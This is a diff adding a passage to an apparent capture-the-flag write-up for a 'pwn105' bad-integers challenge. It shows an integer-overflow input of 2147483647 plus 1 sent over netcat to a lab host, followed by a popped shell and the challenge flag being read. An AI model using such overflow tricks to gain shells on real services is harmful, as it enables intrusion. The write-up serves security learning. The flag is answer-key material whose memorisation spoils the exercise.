@@ -874,6 +874,42 @@ What it does..........
 8. However, if none of those conditions are met, it just adds up our input and returns the calculated value.
 
 
+So, when I give it the input 2,147,483,647 as num1 and 1 as num2, it will evaluate to a negative number.
+
+---
+
+
+```bash
+❯ sudo nc 10.10.18.115 9005
+[sudo] password for lynk: 
+       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
+        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ 
+        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
+                 pwn 105          
+
+
+-------=[ BAD INTEGERS ]=-------
+|-< Enter two numbers to add >-|
+
+]>> 2147483647
+]>> 1
+
+[*] C: -2147483648
+[*] Popped Shell
+[*] Switching to interactive mode
+ls
+flag.txt
+pwn105
+pwn105.c
+cat flag.txt
+THM{VerY_b4D_1n73G3rsss}
+```
+
+---
+
+---
+
+
 
 
 
